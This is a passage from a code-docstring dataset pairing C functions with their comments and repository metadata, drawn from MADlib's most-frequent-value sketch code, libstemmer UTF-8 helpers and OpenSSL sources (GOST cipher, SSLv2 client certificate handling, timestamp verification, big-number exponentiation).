= theguess;\n            theguess += addend;\n        }\n        else {\n            /* overshot */\n            subtrahend = (theguess - themin) / 2;\n            if (!subtrahend) subtrahend = 1;\n            themax = theguess;\n            theguess -= subtrahend;\n        }\n    }\n\n    /* if we got here, continue with a naive linear search on the tail */\n    for (i = hi; i < s->num_vals; i++)\n        if (!memcmp(sortasort_getval(s, i),\n                    DatumExtractPointer(dat, s->typByVal),\n                    len))\n            return i;\n    return -1;\n}", "path": "methods\\sketch\\src\\pg_gp\\sortasort.c", "repo_name": "madlib/archived_madlib", "stars": 511, "license": "apache-2.0", "language": "c", "size": 20169}
{"docstring": "/*!\n * implementation of the merge of two mfv sketches.  we\n * first merge the embedded countmin sketches to get the\n * sums of the counts, and then use those sums to pick the\n * top values for the resulting histogram.  We overwrite\n * the first argument and return it.\n * \\param transblob1 an mfv transval stored inside a bytea\n * \\param transblob2 another mfv transval in a bytea\n */\n", "func_signal": "bytea *mfvsketch_merge_c(bytea *transblob1, bytea *transblob2)", "code": "{\n    mfvtransval *transval1 = (mfvtransval *)VARDATA(transblob1);\n    mfvtransval *transval2 = (mfvtransval *)VARDATA(transblob2);\n    void        *newblob;\n    mfvtransval *newval;\n    uint32       i, j, cnt;\n\n    /* handle uninitialized args */\n    if (VARSIZE(transblob1) <= sizeof(MFV_TRANSVAL_SZ(0))\n        && VARSIZE(transblob2) <= sizeof(MFV_TRANSVAL_SZ(0)))\n        return(transblob1);\n    else if (VARSIZE(transblob1) <= sizeof(MFV_TRANSVAL_SZ(0))) {\n        transblob1 = mfv_init_transval(transval2->max_mfvs, transval2->typOid);\n        transval1 = (mfvtransval *)VARDATA(transblob1);\n    }\n    else if (VARSIZE(transblob2) <= sizeof(MFV_TRANSVAL_SZ(0))) {\n        transblob2 = mfv_init_transval(transval1->max_mfvs, transval1->typOid);\n        transval2 = (mfvtransval *)VARDATA(transblob2);\n    }\n    check_mfvtransval(transblob1);\n    check_mfvtransval(transblob2);\n\n    if ( transval1->typOid != transval2->typOid ) {\n        elog(ERROR, \"cannot merge two transition state with different element type\");\n    }\n\n    /* initialize output */\n    newblob   = mfv_init_transval(transval1->max_mfvs, transval1->typOid);\n    newval    = (mfvtransval *)VARDATA(newblob);\n\n    /* combine sketches */\n    for (i = 0; i < DEPTH; i++)\n        for (j = 0; j < NUMCOUNTERS; j++)\n            newval->sketch[i][j] = transval1->sketch[i][j]\n                                   + transval2->sketch[i][j];\n\n    /* recompute the counts using the merged sketch */\n    for (i = 0; i < transval1->next_mfv; i++) {\n        void *tmpp = mfv_transval_getval(transblob1,i);\n        Datum dat = PointerExtractDatum(tmpp, transval1->typByVal);\n\n        transval1->mfvs[i].cnt = cmsketch_count_c(newval->sketch,\n                                                  dat,\n                                                  newval->outFuncOid,\n                                                  newval->typOid);\n    }\n    for (i = 0; i < transval2->next_mfv; i++) {\n        void *tmpp = mfv_transval_getval(transblob2,i);\n        Datum dat = PointerExtractDatum(tmpp, transval2->typByVal);\n\n        transval2->mfvs[i].cnt = cmsketch_count_c(newval->sketch,\n                                                  dat,\n                                                  newval->outFuncOid,\n                                                  newval->typOid);\n    }\n\n    /* now take maxes on mfvs in a sort-merge style, copying into transval1  */\n    qsort(transval1->mfvs, transval1->next_mfv, sizeof(offsetcnt), cnt_cmp_desc);\n    qsort(transval2->mfvs, transval2->next_mfv, sizeof(offsetcnt), cnt_cmp_desc);\n\n    /* choose top k from transval1 and transval2 */\n    for (i = j = cnt = 0;\n         cnt < newval->max_mfvs\n         && (j < transval2->next_mfv || i < transval1->next_mfv);\n         cnt++) {\n        Datum iDatum, jDatum;\n\n    if (i < transval1->next_mfv &&\n            (j == transval2->next_mfv\n             || transval1->mfvs[i].cnt >= transval2->mfvs[j].cnt)) {\n          /* next item comes from transval1 */\n          iDatum = PointerExtractDatum(mfv_transval_getval(transblob1, i),\n                                       transval1->typByVal);\n          newblob = mfv_transval_append(newblob, iDatum);\n          newval = (mfvtransval *)VARDATA(newblob);\n          newval->mfvs[cnt].cnt = transval1->mfvs[i].cnt;\n          i++;\n        }\n        else if (j < transval2->next_mfv &&\n                 (i == transval1->next_mfv\n                  || transval1->mfvs[i].cnt < transval2->mfvs[j].cnt)) {\n          /* next item comes from transval2 */\n          jDatum = PointerExtractDatum(mfv_transval_getval(transblob2, j),\n                                       transval2->typByVal);\n          newblob = mfv_transval_append(newblob, jDatum);\n          newval = (mfvtransval *)VARDATA(newblob);\n          newval->mfvs[cnt].cnt = transval2->mfvs[j].cnt;\n          j++;\n        }\n    }\n    return(newblob);\n}", "path": "methods\\sketch\\src\\pg_gp\\mfvsketch.c", "repo_name": "madlib/archived_madlib", "stars": 511, "license": "apache-2.0", "language": "c", "size": 20169}
{"docstring": "/*! comparison function for qsort_arg */\n", "func_signal": "int sorta_cmp(const void *i, const void *j, void *thunk)", "code": "{\n    /* the \"thunk\" in this case is the sortasort being sorted */\n    sortasort *s = (sortasort *)thunk;\n    char      *dat1 = sortasort_getval(s, ((unsigned *)i) - s->dir);\n    char      *dat2 = sortasort_getval(s, ((unsigned *)j) - s->dir);\n    int        len = s->typLen;\n    int        shorter;\n\n    /*\n     * we always use typByVal = true, since we've marshalled the data into place\n     */\n    if (len < 0) {\n        len = (int)ExtractDatumLen(PointerGetDatum(dat1), len, s->typByVal, -1);\n        if ((shorter = (len - ExtractDatumLen(PointerGetDatum(dat2), len, s->typByVal, -1))))\n            /* order by length */\n            return shorter;\n        /* else drop through */\n    }\n    /* byte ordering */\n    return memcmp(dat1, dat2, len);\n}", "path": "methods\\sketch\\src\\pg_gp\\sortasort.c", "repo_name": "madlib/archived_madlib", "stars": 511, "license": "apache-2.0", "language": "c", "size": 20169}
{"docstring": "/*!\n *  transition function to maintain a CountMin sketch with\n *  Most-Frequent Values\n */\n", "func_signal": "Datum __mfvsketch_trans(PG_FUNCTION_ARGS)", "code": "{\n    bytea *      transblob = PG_GETARG_BYTEA_P(0);\n    Datum        newdatum  = PG_GETARG_DATUM(1);\n    int          max_mfvs  = PG_GETARG_INT32(2);\n    mfvtransval *transval;\n    uint64       tmpcnt;\n    int          i;\n    Datum        md5_datum;\n\n    /*\n     * This function makes destructive updates to its arguments.\n     * Make sure it's being called in an agg context.\n     */\n    if (!(fcinfo->context &&\n          (IsA(fcinfo->context, AggState)\n   #ifdef NOTGP\n           || IsA(fcinfo->context, WindowAggState)\n   #endif\n          )))\n        elog(ERROR,\n             \"destructive pass by reference outside agg\");\n\n    /* initialize if this is first call */\n    if (VARSIZE(transblob) <= sizeof(MFV_TRANSVAL_SZ(0))) {\n        Oid typOid = get_fn_expr_argtype(fcinfo->flinfo, 1);\n        transblob = mfv_init_transval(max_mfvs, typOid);\n    }\n    else {\n        check_mfvtransval(transblob);\n    }\n\n    /* ignore NULL inputs */\n    if (PG_ARGISNULL(1) || PG_ARGISNULL(2))\n        PG_RETURN_DATUM(PointerGetDatum(transblob));\n\n    transval = (mfvtransval *)VARDATA(transblob);\n    if (transval->typOid != get_fn_expr_argtype(fcinfo->flinfo, 1)) {\n        elog(ERROR, \"cannot aggregate on elements with different types\");\n    }\n    /* insert into the countmin sketch */\n    md5_datum = countmin_trans_c(transval->sketch,\n                                newdatum,\n                                transval->outFuncOid,\n                                transval->typOid);\n\n    tmpcnt = cmsketch_count_md5_datum(transval->sketch,\n                                      (bytea *)DatumGetPointer(md5_datum),\n                                      transval->outFuncOid);\n    i = mfv_find(transblob, newdatum);\n\n    if (i > -1) {\n        transval->mfvs[i].cnt = tmpcnt;\n    }\n    else {\n        /* try to insert as either a new or replacement entry */\n        for (i = 0; i < (int)transval->max_mfvs; i++) {\n            if (i == (int)transval->next_mfv) {\n                /* room for new */\n                transblob = mfv_transval_append(transblob, newdatum);\n                transval = (mfvtransval *)VARDATA(transblob);\n                transval->mfvs[i].cnt = tmpcnt;\n                break;\n            }\n            else if (transval->mfvs[i].cnt < tmpcnt) {\n                /* arg beats this mfv */\n                transblob = mfv_transval_replace(transblob, newdatum, i);\n                transval = (mfvtransval *)VARDATA(transblob);\n                transval->mfvs[i].cnt = tmpcnt;\n                break;\n            }\n            /* else this is not a frequent value */\n        }\n    }\n    PG_RETURN_DATUM(PointerGetDatum(transblob));\n}", "path": "methods\\sketch\\src\\pg_gp\\mfvsketch.c", "repo_name": "madlib/archived_madlib", "stars": 511, "license": "apache-2.0", "language": "c", "size": 20169}
{"docstring": "/*!\n * Initialize an mfv sketch\n * \\param max_mfvs the number of \"bins\" in the histogram\n * \\param typOid the type ID for the column\n */\n", "func_signal": "bytea *mfv_init_transval(int max_mfvs, Oid typOid)", "code": "{\n    int          initial_size;\n    bool         typIsVarLen;\n    bytea *      transblob;\n    mfvtransval *transval;\n\n    /*\n     * initialize mfvtransval, using palloc0 to zero it out.\n     * if typlen is positive (fixed), size chosen accurately.\n     * Else we'll do a conservative estimate of 16 bytes, and repalloc as needed.\n     */\n    if ((initial_size = get_typlen(typOid)) > 0)\n        initial_size *= max_mfvs*get_typlen(typOid);\n    else /* guess */\n        initial_size = max_mfvs*16;\n\n    transblob = (bytea *)palloc0(MFV_TRANSVAL_SZ(max_mfvs) + initial_size);\n\n    SET_VARSIZE(transblob, MFV_TRANSVAL_SZ(max_mfvs) + initial_size);\n    transval = (mfvtransval *)VARDATA(transblob);\n    transval->max_mfvs = max_mfvs;\n    transval->next_mfv = 0;\n    transval->next_offset = MFV_TRANSVAL_SZ(max_mfvs)-VARHDRSZ;\n    transval->typOid = typOid;\n    getTypeOutputInfo(transval->typOid,\n                      &(transval->outFuncOid),\n                      &(typIsVarLen));\n    transval->typLen = get_typlen(transval->typOid);\n    transval->typByVal = get_typbyval(transval->typOid);\n    if (!transval->outFuncOid) {\n        /* no outFunc for this type! */\n        elog(ERROR, \"no outFunc for type %d\", transval->typOid);\n    }\n    return(transblob);\n}", "path": "methods\\sketch\\src\\pg_gp\\mfvsketch.c", "repo_name": "madlib/archived_madlib", "stars": 511, "license": "apache-2.0", "language": "c", "size": 20169}
{"docstring": "/*!\n * look to see if the mfvsketch currently has <c>val</c>\n * stored as one of its most-frequent values.\n * Returns the offset in the <c>mfvs</c> array, or -1\n * if not found.\n * NOTE: a 0 return value means the item <i>was found</i>\n * at offset 0!\n * \\param blob a bytea holding an mfv transval\n * \\param val the datum to search for\n */\n", "func_signal": "int mfv_find(bytea *blob, Datum val)", "code": "{\n    mfvtransval *transval = (mfvtransval *)VARDATA(blob);\n    unsigned     i;\n    uint32       len;\n    void *       datp;\n    Datum        iDat;\n    void        *valp = DatumExtractPointer(val, transval->typByVal);\n\n    /* look for existing entry for this value */\n    for (i = 0; i < transval->next_mfv; i++) {\n        /* if they're the same */\n        datp = mfv_transval_getval(blob,i);\n        iDat = PointerExtractDatum(datp, transval->typByVal);\n\n        if ((len = ExtractDatumLen(iDat, transval->typLen, transval->typByVal, -1))\n            == ExtractDatumLen(val, transval->typLen, transval->typByVal, -1)) {\n            if (!memcmp(datp, valp, len))\n                /* arg is an mfv */\n                return(i);\n        }\n    }\n    return(-1);\n}", "path": "methods\\sketch\\src\\pg_gp\\mfvsketch.c", "repo_name": "madlib/archived_madlib", "stars": 511, "license": "apache-2.0", "language": "c", "size": 20169}
{"docstring": "/*!\n * given a pre-allocated sortasort, set up its metadata\n * first argument s is the\n * \\param s a pre-allocated sortasort\n * \\param capacity size of the sortasort directory\n * \\param s_sz size of s\n * \\param typLen Postgres type length (-1 for bytea, -2 for cstring)\n */\n", "func_signal": "sortasort *\nsortasort_init(sortasort *s,\n               size_t capacity,\n               size_t s_sz,\n               int    typLen,\n               bool   typByVal)", "code": "{\n    /* capacity is the size of the directory: i.e. max number of Datums it can hold */\n    s->capacity = capacity;\n\n    /* storage_sz is the number of bytes available for Datums at the end. */\n    s->storage_sz = s_sz - sizeof(sortasort) - capacity*sizeof(s->dir[0]);\n    if (s_sz - sizeof(sortasort) <= capacity*sizeof(s->dir[0]))\n        elog(\n            ERROR,\n            \"sortasort initialized too small to hold its own directory\");\n\n    s->typLen = typLen;\n    s->typByVal = typByVal;\n\n\n    /* number of values so far */\n    s->num_vals = 0;\n\n    /* offset after the directory to do the next insertion */\n    s->storage_cur = 0;\n    return(s);\n}", "path": "methods\\sketch\\src\\pg_gp\\sortasort.c", "repo_name": "madlib/archived_madlib", "stars": 511, "license": "apache-2.0", "language": "c", "size": 20169}
{"docstring": "/* Code for character groupings: utf8 cases */\n", "func_signal": "static int get_utf8(const symbol * p, int c, int l, int * slot)", "code": "{\n    int b0, b1;\n    if (c >= l) return 0;\n    b0 = p[c++];\n    if (b0 < 0xC0 || c == l) {   /* 1100 0000 */\n        * slot = b0; return 1;\n    }\n    b1 = p[c++];\n    if (b0 < 0xE0 || c == l) {   /* 1110 0000 */\n        * slot = (b0 & 0x1F) << 6 | (b1 & 0x3F); return 2;\n    }\n    * slot = (b0 & 0xF) << 12 | (b1 & 0x3F) << 6 | (p[c] & 0x3F); return 3;\n}", "path": "src\\libstemmer\\runtime\\utilities.c", "repo_name": "madlib/archived_madlib", "stars": 511, "license": "apache-2.0", "language": "c", "size": 20169}
{"docstring": "/*!\n * scalar function taking an mfv sketch, returning a histogram of\n * its most frequent values\n */\n", "func_signal": "Datum __mfvsketch_final(PG_FUNCTION_ARGS)", "code": "{\n    bytea *      transblob = PG_GETARG_BYTEA_P(0);\n    mfvtransval *transval = NULL;\n    ArrayType *  retval;\n    uint32       i;\n    int          dims[2], lbs[2];\n    /* Oid     typInput, typIOParam; */\n    Oid          outFuncOid;\n    bool         typIsVarlena;\n    int16        typlen;\n    bool         typbyval;\n    char         typalign;\n    char         typdelim;\n    Oid          typioparam;\n    Oid          typiofunc;\n\n\n    if (PG_ARGISNULL(0)) PG_RETURN_NULL();\n    if (VARSIZE(transblob) < MFV_TRANSVAL_SZ(0)) PG_RETURN_NULL();\n\n    check_mfvtransval(transblob);\n    transval = (mfvtransval *)VARDATA(transblob);\n    /*\n     * We only declare the variable-length array histo here after some sanity\n     * checking. We risk a stack overflow otherwise. In particular, we need to\n     * make sure that transval->max_mfvs is initialized. It might not be if the\n     * (strict) transition function is never called. (MADLIB-254)\n     */\n    Datum        histo[transval->max_mfvs][2];\n\n    qsort(transval->mfvs, transval->next_mfv, sizeof(offsetcnt), cnt_cmp_desc);\n    getTypeOutputInfo(INT8OID,\n                      &outFuncOid,\n                      &typIsVarlena);\n\n    for (i = 0; i < transval->next_mfv; i++) {\n        void *tmpp = mfv_transval_getval(transblob,i);\n        Datum curval = PointerExtractDatum(tmpp, transval->typByVal);\n        char *countbuf =\n            OidOutputFunctionCall(outFuncOid,\n                                  Int64GetDatum(transval->mfvs[i].cnt));\n        char *valbuf = OidOutputFunctionCall(transval->outFuncOid, curval);\n\n        histo[i][0] = PointerGetDatum(cstring_to_text(valbuf));\n        histo[i][1] = PointerGetDatum(cstring_to_text(countbuf));\n        pfree(countbuf);\n        pfree(valbuf);\n    }\n\n    /*\n     * Get info about element type\n     */\n    get_type_io_data(TEXTOID, IOFunc_output,\n                     &typlen, &typbyval,\n                     &typalign, &typdelim,\n                     &typioparam, &typiofunc);\n\n    dims[0] = i;\n    dims[1] = 2;\n    lbs[0] = lbs[1] = 0;\n    retval = construct_md_array((Datum *)histo,\n                                NULL,\n                                2,\n                                dims,\n                                lbs,\n                                TEXTOID,\n                                -1,\n                                0,\n                                'i');\n    PG_RETURN_ARRAYTYPE_P(retval);\n}", "path": "methods\\sketch\\src\\pg_gp\\mfvsketch.c", "repo_name": "madlib/archived_madlib", "stars": 511, "license": "apache-2.0", "language": "c", "size": 20169}
{"docstring": "/*!\n * copy datum <c>dat</c> into the offset of position <c>index</c> of\n * the mfv sketch stored in <c>transblob</c>.\n *\n * <i>Caller beware: this helper return assumes that\n * <c>dat</c> is small enough to fit in the storage\n * currently used by the datum at position <c>index</c>.</i>\n *\n * \\param transblob a bytea holding and mfv transval\n * \\param index the index of the destination for copying\n * \\param dat the datum to be copied into the transval\n */\n", "func_signal": "void mfv_copy_datum(bytea *transblob, int index, Datum dat)", "code": "{\n    mfvtransval *transval = (mfvtransval *)VARDATA(transblob);\n    size_t       datumLen = ExtractDatumLen(dat, transval->typLen, transval->typByVal, -1);\n    void *       curval = (char*)transval +  transval->mfvs[index].offset;\n\n    memmove(curval, (void *)DatumExtractPointer(dat, transval->typByVal), datumLen);\n}", "path": "methods\\sketch\\src\\pg_gp\\mfvsketch.c", "repo_name": "madlib/archived_madlib", "stars": 511, "license": "apache-2.0", "language": "c", "size": 20169}
{"docstring": "/*!\n * replace the value at position i of the mfvsketch with dat\n *\n * \\param transblob the transition value packed into a bytea\n * \\param dat the value to be inserted\n * \\param i the position to replace\n */\n", "func_signal": "bytea *mfv_transval_replace(bytea *transblob, Datum dat, int i)", "code": "{\n    /*\n     * if new value is smaller than old, we overwrite at the old offset.\n     * otherwise we call mfv_transval_insert_at which will take care of\n     * space allocation for the new value\n     */\n    mfvtransval *transval = (mfvtransval *)VARDATA(transblob);\n    size_t       datumLen = ExtractDatumLen(dat, transval->typLen, transval->typByVal, -1);\n    void *       tmpp = mfv_transval_getval(transblob,i);\n    Datum        oldDat = PointerExtractDatum(tmpp, transval->typByVal);\n    size_t       oldLen = ExtractDatumLen(oldDat, transval->typLen, transval->typByVal, -1);\n\n    if (datumLen <= oldLen) {\n        mfv_copy_datum(transblob, i, dat);\n        return transblob;\n    }\n    else return(mfv_transval_insert_at(transblob, dat, i));\n}", "path": "methods\\sketch\\src\\pg_gp\\mfvsketch.c", "repo_name": "madlib/archived_madlib", "stars": 511, "license": "apache-2.0", "language": "c", "size": 20169}
{"docstring": "/*\n   new_p = skip_utf8(p, c, lb, l, n); skips n characters forwards from p + c\n   if n +ve, or n characters backwards from p + c - 1 if n -ve. new_p is the new\n   position, or 0 on failure.\n\n   -- used to implement hop and next in the utf8 case.\n*/\n", "func_signal": "extern int skip_utf8(const symbol * p, int c, int lb, int l, int n)", "code": "{\n    int b;\n    if (n >= 0) {\n        for (; n > 0; n--) {\n            if (c >= l) return -1;\n            b = p[c++];\n            if (b >= 0xC0) {   /* 1100 0000 */\n                while (c < l) {\n                    b = p[c];\n                    if (b >= 0xC0 || b < 0x80) break;\n                    /* break unless b is 10------ */\n                    c++;\n                }\n            }\n        }\n    } else {\n        for (; n < 0; n++) {\n            if (c <= lb) return -1;\n            b = p[--c];\n            if (b >= 0x80) {   /* 1000 0000 */\n                while (c > lb) {\n                    b = p[c];\n                    if (b >= 0xC0) break; /* 1100 0000 */\n                    c--;\n                }\n            }\n        }\n    }\n    return c;\n}", "path": "src\\libstemmer\\runtime\\utilities.c", "repo_name": "madlib/archived_madlib", "stars": 511, "license": "apache-2.0", "language": "c", "size": 20169}
{"docstring": "/* Cleans up key from context */\n", "func_signal": "void gost_destroy(gost_ctx * c)", "code": "{\n    int i;\n    for (i = 0; i < 8; i++)\n        c->k[i] = 0;\n}", "path": "src\\nginx\\objs\\lib_x64\\openssl\\engines\\ccgost\\gost89.c", "repo_name": "LomoX-Offical/nginx-openresty-windows", "stars": 414, "license": "None", "language": "c", "size": 131272}
{"docstring": "/* read the data and then respond */\n", "func_signal": "static int client_certificate(SSL *s)", "code": "{\n    unsigned char *buf;\n    unsigned char *p, *d;\n    int i;\n    unsigned int n;\n    int cert_ch_len;\n    unsigned char *cert_ch;\n\n    buf = (unsigned char *)s->init_buf->data;\n\n    /*\n     * We have a cert associated with the SSL, so attach it to the session if\n     * it does not have one\n     */\n\n    if (s->state == SSL2_ST_SEND_CLIENT_CERTIFICATE_A) {\n        i = ssl2_read(s, (char *)&(buf[s->init_num]),\n                      SSL2_MAX_CERT_CHALLENGE_LENGTH + 2 - s->init_num);\n        if (i < (SSL2_MIN_CERT_CHALLENGE_LENGTH + 2 - s->init_num))\n            return (ssl2_part_read(s, SSL_F_CLIENT_CERTIFICATE, i));\n        s->init_num += i;\n        if (s->msg_callback) {\n            /* REQUEST-CERTIFICATE */\n            s->msg_callback(0, s->version, 0, buf, (size_t)s->init_num, s,\n                            s->msg_callback_arg);\n        }\n\n        /* type=buf[0]; */\n        /* type eq x509 */\n        if (buf[1] != SSL2_AT_MD5_WITH_RSA_ENCRYPTION) {\n            ssl2_return_error(s, SSL2_PE_UNSUPPORTED_CERTIFICATE_TYPE);\n            SSLerr(SSL_F_CLIENT_CERTIFICATE, SSL_R_BAD_AUTHENTICATION_TYPE);\n            return (-1);\n        }\n\n        if ((s->cert == NULL) ||\n            (s->cert->key->x509 == NULL) ||\n            (s->cert->key->privatekey == NULL)) {\n            s->state = SSL2_ST_X509_GET_CLIENT_CERTIFICATE;\n        } else\n            s->state = SSL2_ST_SEND_CLIENT_CERTIFICATE_C;\n    }\n\n    cert_ch = buf + 2;\n    cert_ch_len = s->init_num - 2;\n\n    if (s->state == SSL2_ST_X509_GET_CLIENT_CERTIFICATE) {\n        X509 *x509 = NULL;\n        EVP_PKEY *pkey = NULL;\n\n        /*\n         * If we get an error we need to ssl->rwstate=SSL_X509_LOOKUP;\n         * return(error); We should then be retried when things are ok and we\n         * can get a cert or not\n         */\n\n        i = 0;\n        if (s->ctx->client_cert_cb != NULL) {\n            i = s->ctx->client_cert_cb(s, &(x509), &(pkey));\n        }\n\n        if (i < 0) {\n            s->rwstate = SSL_X509_LOOKUP;\n            return (-1);\n        }\n        s->rwstate = SSL_NOTHING;\n\n        if ((i == 1) && (pkey != NULL) && (x509 != NULL)) {\n            s->state = SSL2_ST_SEND_CLIENT_CERTIFICATE_C;\n            if (!SSL_use_certificate(s, x509) || !SSL_use_PrivateKey(s, pkey)) {\n                i = 0;\n            }\n            X509_free(x509);\n            EVP_PKEY_free(pkey);\n        } else if (i == 1) {\n            if (x509 != NULL)\n                X509_free(x509);\n            if (pkey != NULL)\n                EVP_PKEY_free(pkey);\n            SSLerr(SSL_F_CLIENT_CERTIFICATE,\n                   SSL_R_BAD_DATA_RETURNED_BY_CALLBACK);\n            i = 0;\n        }\n\n        if (i == 0) {\n            /*\n             * We have no client certificate to respond with so send the\n             * correct error message back\n             */\n            s->state = SSL2_ST_SEND_CLIENT_CERTIFICATE_B;\n            p = buf;\n            *(p++) = SSL2_MT_ERROR;\n            s2n(SSL2_PE_NO_CERTIFICATE, p);\n            s->init_off = 0;\n            s->init_num = 3;\n            /* Write is done at the end */\n        }\n    }\n\n    if (s->state == SSL2_ST_SEND_CLIENT_CERTIFICATE_B) {\n        return (ssl2_do_write(s));\n    }\n\n    if (s->state == SSL2_ST_SEND_CLIENT_CERTIFICATE_C) {\n        EVP_MD_CTX ctx;\n\n        /*\n         * ok, now we calculate the checksum do it first so we can reuse buf\n         * :-)\n         */\n        p = buf;\n        EVP_MD_CTX_init(&ctx);\n        EVP_SignInit_ex(&ctx, s->ctx->rsa_md5, NULL);\n        EVP_SignUpdate(&ctx, s->s2->key_material, s->s2->key_material_length);\n        EVP_SignUpdate(&ctx, cert_ch, (unsigned int)cert_ch_len);\n        i = i2d_X509(s->session->sess_cert->peer_key->x509, &p);\n        /*\n         * Don't update the signature if it fails - FIXME: probably should\n         * handle this better\n         */\n        if (i > 0)\n            EVP_SignUpdate(&ctx, buf, (unsigned int)i);\n\n        p = buf;\n        d = p + 6;\n        *(p++) = SSL2_MT_CLIENT_CERTIFICATE;\n        *(p++) = SSL2_CT_X509_CERTIFICATE;\n        n = i2d_X509(s->cert->key->x509, &d);\n        s2n(n, p);\n\n        if (!EVP_SignFinal(&ctx, d, &n, s->cert->key->privatekey)) {\n            /*\n             * this is not good.  If things have failed it means there so\n             * something wrong with the key. We will continue with a 0 length\n             * signature\n             */\n        }\n        EVP_MD_CTX_cleanup(&ctx);\n        s2n(n, p);\n        d += n;\n\n        s->state = SSL2_ST_SEND_CLIENT_CERTIFICATE_D;\n        s->init_num = d - buf;\n        s->init_off = 0;\n    }\n    /* if (s->state == SSL2_ST_SEND_CLIENT_CERTIFICATE_D) */\n    return (ssl2_do_write(s));\n}", "path": "src\\nginx\\objs\\lib_x64\\openssl\\ssl\\s2_clnt.c", "repo_name": "LomoX-Offical/nginx-openresty-windows", "stars": 414, "license": "None", "language": "c", "size": 131272}
{"docstring": "/* Encrypts one block using specified key */\n", "func_signal": "void gost_enc_with_key(gost_ctx * c, byte * key, byte * inblock,\n                       byte * outblock)", "code": "{\n    gost_key(c, key);\n    gostcrypt(c, inblock, outblock);\n}", "path": "src\\nginx\\objs\\lib_x64\\openssl\\engines\\ccgost\\gost89.c", "repo_name": "LomoX-Offical/nginx-openresty-windows", "stars": 414, "license": "None", "language": "c", "size": 131272}
{"docstring": "/* Initalize context. Provides default value for subst_block */\n", "func_signal": "void gost_init(gost_ctx * c, const gost_subst_block * b)", "code": "{\n    if (!b) {\n        b = &GostR3411_94_TestParamSet;\n    }\n    kboxinit(c, b);\n}", "path": "src\\nginx\\objs\\lib_x64\\openssl\\engines\\ccgost\\gost89.c", "repo_name": "LomoX-Offical/nginx-openresty-windows", "stars": 414, "license": "None", "language": "c", "size": 131272}
{"docstring": "/* Part of GOST 28147 algorithm moved into separate function */\n", "func_signal": "static word32 f(gost_ctx * c, word32 x)", "code": "{\n    x = c->k87[x >> 24 & 255] | c->k65[x >> 16 & 255] |\n        c->k43[x >> 8 & 255] | c->k21[x & 255];\n    /* Rotate left 11 bits */\n    return x << 11 | x >> (32 - 11);\n}", "path": "src\\nginx\\objs\\lib_x64\\openssl\\engines\\ccgost\\gost89.c", "repo_name": "LomoX-Offical/nginx-openresty-windows", "stars": 414, "license": "None", "language": "c", "size": 131272}
{"docstring": "/*\n * Check if the specified TSA name matches either the subject or one of the\n * subject alternative names of the TSA certificate.\n */\n", "func_signal": "static int TS_check_signer_name(GENERAL_NAME *tsa_name, X509 *signer)", "code": "{\n    STACK_OF(GENERAL_NAME) *gen_names = NULL;\n    int idx = -1;\n    int found = 0;\n\n    /* Check the subject name first. */\n    if (tsa_name->type == GEN_DIRNAME\n        && X509_name_cmp(tsa_name->d.dirn, signer->cert_info->subject) == 0)\n        return 1;\n\n    /* Check all the alternative names. */\n    gen_names = X509_get_ext_d2i(signer, NID_subject_alt_name, NULL, &idx);\n    while (gen_names != NULL\n           && !(found = TS_find_name(gen_names, tsa_name) >= 0)) {\n        /*\n         * Get the next subject alternative name, although there should be no\n         * more than one.\n         */\n        GENERAL_NAMES_free(gen_names);\n        gen_names = X509_get_ext_d2i(signer, NID_subject_alt_name,\n                                     NULL, &idx);\n    }\n    if (gen_names)\n        GENERAL_NAMES_free(gen_names);\n\n    return found;\n}", "path": "src\\nginx\\objs\\lib\\openssl\\crypto\\ts\\ts_rsp_verify.c", "repo_name": "LomoX-Offical/nginx-openresty-windows", "stars": 414, "license": "None", "language": "c", "size": 131272}
{"docstring": "/* this one works - simple but works */\n", "func_signal": "int BN_exp(BIGNUM *r, const BIGNUM *a, const BIGNUM *p, BN_CTX *ctx)", "code": "{\n    int i, bits, ret = 0;\n    BIGNUM *v, *rr;\n\n    if (BN_get_flags(p, BN_FLG_CONSTTIME) != 0) {\n        /* BN_FLG_CONSTTIME only supported by BN_mod_exp_mont() */\n        BNerr(BN_F_BN_EXP, ERR_R_SHOULD_NOT_HAVE_BEEN_CALLED);\n        return -1;\n    }\n\n    BN_CTX_start(ctx);\n    if ((r == a) || (r == p))\n        rr = BN_CTX_get(ctx);\n    else\n        rr = r;\n    v = BN_CTX_get(ctx);\n    if (rr == NULL || v == NULL)\n        goto err;\n\n    if (BN_copy(v, a) == NULL)\n        goto err;\n    bits = BN_num_bits(p);\n\n    if (BN_is_odd(p)) {\n        if (BN_copy(rr, a) == NULL)\n            goto err;\n    } else {\n        if (!BN_one(rr))\n            goto err;\n    }\n\n    for (i = 1; i < bits; i++) {\n        if (!BN_sqr(v, v, ctx))\n            goto err;\n        if (BN_is_bit_set(p, i)) {\n            if (!BN_mul(rr, rr, v, ctx))\n                goto err;\n        }\n    }\n    if (r != rr && BN_copy(r, rr) == NULL)\n        goto err;\n\n    ret = 1;\n err:\n    BN_CTX_end(ctx);\n    bn_check_top(r);\n    return (ret);\n}", "path": "src\\nginx\\objs\\lib\\openssl\\crypto\\bn\\bn_exp.c", "repo_name": "LomoX-Offical/nginx-openresty-windows", "stars": 414, "license": "None", "language": "c", "size": 131272}
{"docstring": "/*\n * Tries to extract a TS_TST_INFO structure from the PKCS7 token and\n * calls the internal int_TS_RESP_verify_token function for verifying it.\n */\n", "func_signal": "int TS_RESP_verify_token(TS_VERIFY_CTX *ctx, PKCS7 *token)", "code": "{\n    TS_TST_INFO *tst_info = PKCS7_to_TS_TST_INFO(token);\n    int ret = 0;\n    if (tst_info) {\n        ret = int_TS_RESP_verify_token(ctx, token, tst_info);\n        TS_TST_INFO_free(tst_info);\n    }\n    return ret;\n}", "path": "src\\nginx\\objs\\lib\\openssl\\crypto\\ts\\ts_rsp_verify.c", "repo_name": "LomoX-Offical/nginx-openresty-windows", "stars": 414, "license": "None", "language": "c", "size": 131272}
{"docstring": "/* Returns 1 if name is in gen_names, 0 otherwise. */\n", "func_signal": "static int TS_find_name(STACK_OF(GENERAL_NAME) *gen_names, GENERAL_NAME *name)", "code": "{\n    int i, found;\n    for (i = 0, found = 0; !found && i < sk_GENERAL_NAME_num(gen_names); ++i) {\n        GENERAL_NAME *current = sk_GENERAL_NAME_value(gen_names, i);\n        found = GENERAL_NAME_cmp(current, name) == 0;\n    }\n    return found ? i - 1 : -1;\n}", "path": "src\\nginx\\objs\\lib\\openssl\\crypto\\ts\\ts_rsp_verify.c", "repo_name": "LomoX-Offical/nginx-openresty-windows", "stars": 414, "license": "None", "language": "c", "size": 131272}
